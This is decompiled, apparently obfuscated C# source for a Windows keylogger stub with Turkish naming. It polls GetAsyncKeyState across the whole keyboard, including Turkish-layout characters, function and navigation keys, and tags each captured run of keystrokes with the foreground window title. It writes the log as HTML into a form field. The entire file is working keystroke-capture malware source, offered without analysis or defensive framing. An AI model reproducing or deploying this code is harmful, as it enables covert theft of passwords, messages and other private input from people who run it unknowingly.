using System.Diagnostics;
using System.Runtime.InteropServices;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;

namespace Stubich;

public class Tus
{
	private static string string_0;

	[DebuggerNonUserCode]
	public Tus()
	{
		Class7.wu3uG8qzm2R30();
		base._002Ector();
	}

	static Tus()
	{
		Class7.wu3uG8qzm2R30();
		string_0 = null;
	}

	private static void smethod_0()
	{
		if (Operators.CompareString(string_0, smethod_1(), false) != 0)
		{
			smethod_2("\r\n\r\n<b><br><br><font color=Red>-----[" + smethod_1() + "]-----</font><br></b>\r\n");
			string_0 = smethod_1();
		}
	}

	private static string smethod_1()
	{
		string string_ = new string('\0', 100);
		GetWindowTextA(GetForegroundWindow(), ref string_, 100);
		return string_.Substring(0, checked(Strings.InStr(string_, "\0", (CompareMethod)0) - 1));
	}

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetAsyncKeyState(long long_0);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetForegroundWindow();

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetWindowTextA(int int_0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_1, int int_1);

	public static void Klavyeyi_Dinlemeye_Al()
	{
		bool capsLock = ((Computer)Class2.Class1_0).get_Keyboard().get_CapsLock();
		bool shiftKeyDown = ((Computer)Class2.Class1_0).get_Keyboard().get_ShiftKeyDown();
		bool altKeyDown = ((Computer)Class2.Class1_0).get_Keyboard().get_AltKeyDown();
		if ((GetAsyncKeyState(69L) & 1) > 0)
		{
			smethod_0();
			if (capsLock && !shiftKeyDown && !altKeyDown)
			{
				smethod_2("E");
			}
			if (!capsLock && shiftKeyDown && !altKeyDown)
			{
				smethod_2("E");
			}
			if (capsLock && shiftKeyDown && !altKeyDown)
			{
				smethod_2("e");
			}
			if (!capsLock && !shiftKeyDown && !altKeyDown)
			{
				smethod_2("e");
			}
			if (altKeyDown && !shiftKeyDown)
			{
				smethod_2("€");
			}
		}
		if ((GetAsyncKeyState(81L) & 1) > 0)
		{
			smethod_0();
			if (capsLock && !shiftKeyDown && !altKeyDown)
			{
				smethod_2("Q");
			}
			if (!capsLock && shiftKeyDown && !altKeyDown)
			{
				smethod_2("Q");
			}
			if (capsLock && shiftKeyDown && !altKeyDown)
			{
				smethod_2("q");
			}
			if (!capsLock && !shiftKeyDown && !altKeyDown)
			{
				smethod_2("q");
			}
			if (altKeyDown && !shiftKeyDown)
			{
				smethod_2("@");
			}
		}
		if ((GetAsyncKeyState(73L) & 1) > 0)
		{
			smethod_0();
			if (capsLock && !shiftKeyDown)
			{
				smethod_2("I");
			}
			if (!capsLock && shiftKeyDown)
			{
				smethod_2("I");
			}
			if (capsLock && shiftKeyDown)
			{
				smethod_2("ı");
			}
			if (!capsLock && !shiftKeyDown)
			{
				smethod_2("ı");
			}
		}
		if ((GetAsyncKeyState(83L) & 1) > 0)
		{
			smethod_0();
			if (capsLock && !shiftKeyDown && !altKeyDown)
			{
				smethod_2("S");
			}
			if (!capsLock && shiftKeyDown && !altKeyDown)
			{
				smethod_2("S");
			}
			if (capsLock && shiftKeyDown && !altKeyDown)
			{
				smethod_2("s");
			}
			if (!capsLock && !shiftKeyDown && !altKeyDown)
			{
				smethod_2("s");
			}
			if (altKeyDown && !shiftKeyDown)
			{
				smethod_2("ß");
			}
		}
		int num = 65;
		do
		{
			if ((GetAsyncKeyState(num) & 1) > 0)
			{
				smethod_0();
				if (capsLock && shiftKeyDown)
				{
					smethod_2(Conversions.ToString(Strings.Chr(checked(num + 32))));
				}
				if (!capsLock && !shiftKeyDown)
				{
					smethod_2(Conversions.ToString(Strings.Chr(checked(num + 32))));
				}
				if (capsLock && !shiftKeyDown)
				{
					smethod_2(Conversions.ToString(Strings.Chr(num)));
				}
				if (!capsLock && shiftKeyDown)
				{
					smethod_2(Conversions.ToString(Strings.Chr(num)));
				}
			}
			num = checked(num + 1);
		}
		while (num <= 90);
		int num2 = 186;
		do
		{
			if ((GetAsyncKeyState(num2) & 1) > 0)
			{
				smethod_0();
				switch (num2)
				{
				case 186:
					if (capsLock && !shiftKeyDown)
					{
						smethod_2("Ş");
					}
					if (!capsLock && shiftKeyDown)
					{
						smethod_2("Ş");
					}
					if (capsLock && shiftKeyDown)
					{
						smethod_2("ş");
					}
					if (!capsLock && !shiftKeyDown)
					{
						smethod_2("ş");
					}
					break;
				case 188:
					if (!shiftKeyDown && !altKeyDown)
					{
						smethod_2(",");
					}
					if (!shiftKeyDown && altKeyDown)
					{
						smethod_2("`");
					}
					if (shiftKeyDown && !altKeyDown)
					{
						smethod_2(";");
					}
					break;
				case 189:
					if (!shiftKeyDown && !altKeyDown)
					{
						smethod_2("-");
					}
					if (shiftKeyDown && !altKeyDown)
					{
						smethod_2("_");
					}
					if (!shiftKeyDown && altKeyDown)
					{
						smethod_2("|");
					}
					break;
				case 190:
					if (!shiftKeyDown && !altKeyDown)
					{
						smethod_2(".");
					}
					if (!shiftKeyDown && altKeyDown)
					{
						smethod_2("");
					}
					if (shiftKeyDown && !altKeyDown)
					{
						smethod_2(":");
					}
					break;
				case 191:
					if (capsLock && !shiftKeyDown)
					{
						smethod_2("Ö");
					}
					if (!capsLock && shiftKeyDown)
					{
						smethod_2("Ö");
					}
					if (capsLock && shiftKeyDown)
					{
						smethod_2("ö");
					}
					if (!capsLock && !shiftKeyDown)
					{
						smethod_2("ö");
					}
					break;
				case 192:
					if (!shiftKeyDown && !altKeyDown)
					{
						smethod_2("\"");
					}
					if (shiftKeyDown && !altKeyDown)
					{
						smethod_2("é");
					}
					if (!shiftKeyDown && altKeyDown)
					{
						smethod_2("<");
					}
					break;
				case 219:
					if (capsLock && !shiftKeyDown)
					{
						smethod_2("Ğ");
					}
					if (!capsLock && shiftKeyDown)
					{
						smethod_2("Ğ");
					}
					if (capsLock && shiftKeyDown)
					{
						smethod_2("ğ");
					}
					if (!capsLock && !shiftKeyDown)
					{
						smethod_2("ğ");
					}
					break;
				case 220:
					if (capsLock && !shiftKeyDown)
					{
						smethod_2("Ç");
					}
					if (!capsLock && shiftKeyDown)
					{
						smethod_2("Ç");
					}
					if (capsLock && shiftKeyDown)
					{
						smethod_2("ç");
					}
					if (!capsLock && !shiftKeyDown)
					{
						smethod_2("ç");
					}
					break;
				case 221:
					if (capsLock && !shiftKeyDown)
					{
						smethod_2("Ü");
					}
					if (!capsLock && shiftKeyDown)
					{
						smethod_2("Ü");
					}
					if (capsLock && shiftKeyDown)
					{
						smethod_2("ü");
					}
					if (!capsLock && !shiftKeyDown)
					{
						smethod_2("ü");
					}
					break;
				case 222:
					if (capsLock && !shiftKeyDown)
					{
						smethod_2("İ");
					}
					if (!capsLock && shiftKeyDown)
					{
						smethod_2("İ");
					}
					if (capsLock && shiftKeyDown)
					{
						smethod_2("i");
					}
					if (!capsLock && !shiftKeyDown)
					{
						smethod_2("i");
					}
					break;
				case 223:
					if (!shiftKeyDown && !altKeyDown)
					{
						smethod_2("*");
					}
					if (shiftKeyDown && !altKeyDown)
					{
						smethod_2("?");
					}
					if (!shiftKeyDown && altKeyDown)
					{
						smethod_2("\\");
					}
					break;
				case 226:
					if (shiftKeyDown && !altKeyDown)
					{
						smethod_2(">");
					}
					if (!shiftKeyDown && !altKeyDown)
					{
						smethod_2("<");
					}
					if (!shiftKeyDown && altKeyDown)
					{
						smethod_2("|");
					}
					break;
				}
			}
			num2 = checked(num2 + 1);
		}
		while (num2 <= 226);
		int num3 = 106;
		int num7;
		checked
		{
			do
			{
				if ((GetAsyncKeyState(num3) & 1) > 0)
				{
					smethod_0();
					switch (num3)
					{
					case 106:
						smethod_2("*");
						break;
					case 107:
						smethod_2("+");
						break;
					case 109:
						smethod_2("-");
						break;
					case 110:
						smethod_2(",");
						break;
					case 111:
						smethod_2("/");
						break;
					}
				}
				num3++;
			}
			while (num3 <= 111);
			int num4 = 8;
			do
			{
				if ((GetAsyncKeyState(num4) & 1) > 0)
				{
					smethod_0();
					switch (num4)
					{
					case 8:
						smethod_2("<font color=RoyalBlue>[Back]</font>");
						break;
					case 9:
						smethod_2("<font color=RoyalBlue>[Tab]</font>");
						break;
					case 13:
						smethod_2("<br>");
						break;
					case 19:
						smethod_2("<font color=RoyalBlue>[Pause]</font>");
						break;
					case 32:
						smethod_2(" ");
						break;
					case 33:
						smethod_2("<font color=RoyalBlue>[Page Up]</font>");
						break;
					case 34:
						smethod_2("<font color=RoyalBlue>[Page Down]</font>");
						break;
					case 35:
						smethod_2("<font color=RoyalBlue>[End]</font>");
						break;
					case 36:
						smethod_2("<font color=RoyalBlue>[Home]</font>");
						break;
					case 37:
						smethod_2("<font color=RoyalBlue>[Sol]</font>");
						break;
					case 38:
						smethod_2("<font color=RoyalBlue>[Yukarı]</font>");
						break;
					case 39:
						smethod_2("<font color=RoyalBlue>[Sag]</font>");
						break;
					case 40:
						smethod_2("<font color=RoyalBlue>[Aşagı]</font>");
						break;
					case 44:
						smethod_2("<font color=RoyalBlue>[Print]</font>");
						break;
					case 45:
						smethod_2("<font color=RoyalBlue>[Insert]</font>");
						break;
					case 46:
						smethod_2("<font color=RoyalBlue>[Delete]</font>");
						break;
					}
				}
				num4++;
			}
			while (num4 <= 47);
			int num5 = 96;
			do
			{
				if ((GetAsyncKeyState(num5) & 1) > 0)
				{
					smethod_0();
					smethod_2(Conversions.ToString(num5 - 96));
				}
				num5++;
			}
			while (num5 <= 105);
			int num6 = 112;
			do
			{
				if ((GetAsyncKeyState(num6) & 1) > 0)
				{
					smethod_0();
					smethod_2("<font color=RoyalBlue>[F" + Conversions.ToString(num6 - 111) + "]</font>");
				}
				num6++;
			}
			while (num6 <= 123);
			num7 = 48;
		}
		do
		{
			if ((GetAsyncKeyState(num7) & 1) > 0)
			{
				smethod_0();
				switch (num7)
				{
				case 48:
					if (!shiftKeyDown && !altKeyDown)
					{
						smethod_2("0");
					}
					if (shiftKeyDown && !altKeyDown)
					{
						smethod_2("=");
					}
					if (!shiftKeyDown && altKeyDown)
					{
						smethod_2("}");
					}
					break;
				case 49:
					if (!shiftKeyDown && !altKeyDown)
					{
						smethod_2("1");
					}
					if (shiftKeyDown && !altKeyDown)
					{
						smethod_2("!");
					}
					if (!shiftKeyDown && altKeyDown)
					{
						smethod_2(">");
					}
					break;
				case 50:
					if (!shiftKeyDown && !altKeyDown)
					{
						smethod_2("2");
					}
					if (shiftKeyDown && !altKeyDown)
					{
						smethod_2("'");
					}
					if (!shiftKeyDown && altKeyDown)
					{
						smethod_2("£");
					}
					break;
				case 51:
					if (!shiftKeyDown && !altKeyDown)
					{
						smethod_2("3");
					}
					if (shiftKeyDown && !altKeyDown)
					{
						smethod_2("^");
					}
					if (!shiftKeyDown && altKeyDown)
					{
						smethod_2("#");
					}
					break;
				case 52:
					if (!shiftKeyDown && !altKeyDown)
					{
						smethod_2("4");
					}
					if (shiftKeyDown && !altKeyDown)
					{
						smethod_2("+");
					}
					if (!shiftKeyDown && altKeyDown)
					{
						smethod_2("$");
					}
					break;
				case 53:
					if (!shiftKeyDown && !altKeyDown)
					{
						smethod_2("5");
					}
					if (shiftKeyDown && !altKeyDown)
					{
						smethod_2("%");
					}
					if (!shiftKeyDown && altKeyDown)
					{
						smethod_2("½");
					}
					break;
				case 54:
					if (!shiftKeyDown && !altKeyDown)
					{
						smethod_2("6");
					}
					if (shiftKeyDown && !altKeyDown)
					{
						smethod_2("&");
					}
					if (!shiftKeyDown && altKeyDown)
					{
						smethod_2("");
					}
					break;
				case 55:
					if (!shiftKeyDown && !altKeyDown)
					{
						smethod_2("7");
					}
					if (shiftKeyDown && !altKeyDown)
					{
						smethod_2("/");
					}
					if (!shiftKeyDown && altKeyDown)
					{
						smethod_2("{");
					}
					break;
				case 56:
					if (!shiftKeyDown && !altKeyDown)
					{
						smethod_2("8");
					}
					if (shiftKeyDown && !altKeyDown)
					{
						smethod_2("(");
					}
					if (!shiftKeyDown && altKeyDown)
					{
						smethod_2("[");
					}
					break;
				case 57:
					if (!shiftKeyDown && !altKeyDown)
					{
						smethod_2("9");
					}
					if (shiftKeyDown && !altKeyDown)
					{
						smethod_2(")");
					}
					if (!shiftKeyDown && altKeyDown)
					{
						smethod_2("]");
					}
					break;
				}
			}
			num7 = checked(num7 + 1);
		}
		while (num7 <= 57);
	}

	private static void smethod_2(string string_1)
	{
		Class2.wiWtuWdmw.Form1.vmethod_0().set_Text(Class2.wiWtuWdmw.Form1.vmethod_0().get_Text() + string_1);
	}
}
